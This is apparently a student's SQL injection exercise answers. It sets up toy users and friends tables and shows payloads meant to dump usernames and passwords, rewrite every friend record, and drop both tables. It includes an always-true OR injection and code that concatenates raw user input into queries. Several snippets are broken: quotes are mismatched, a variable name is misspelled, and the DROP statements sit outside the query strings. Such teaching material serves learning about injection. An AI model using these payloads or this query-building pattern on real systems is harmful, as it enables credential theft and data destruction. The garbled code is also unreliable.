CREATE TABLE users (
    userid INT PRIMARY KEY,
    username TEXT,
    email TEXT,
    password TEXT
);
CREATE TABLE friends (
    friendid INT PRIMARY KEY,
    userid INT,
    name TEXT,
    phone DATETIME,
    age INT
);

-- 1. Write an attack which will list all the usernames and their passwords.
    -- method 1: since OR ""="" is always TRUE.
SELECT username, password FROM users WHERE username ="" or ""="" AND password = "" or ""="";

    -- method 2:
uName = getRequestString("username");
uPass = getRequestString("password");
sql = "SELECT username, password FROM users WHERE username="' + uNam +'" AND password="' +uPass+'" ";

-- 2. Write an attack which will update the table so that every entry in the friends table has their userid set to 42. (Hopefully this is the id of your account, and now everyone has to be friends with you. Who said hackers were loners and never had any friends!)
txt_friend_id = getRequestString("friendid"); -- fetched from user input
txt_sql = "UPDATE friends SET userid = 42 WHERE friendid = " + txt_friend_id;

-- 3. Write an attack which will drop both tables.
txt_friend_id = getRequestString("friendid") -- fetched from user input
txt_sql1 = "SELECT * FROM friends WHERE friendid= " + txt_friend_id; DROP TABLE friends;

txt_user_id = getRequestString("userid")
txt_sql2 = "SELECT * FROM users WHERE userid= " + txt_user_id; DROP TABLE users;
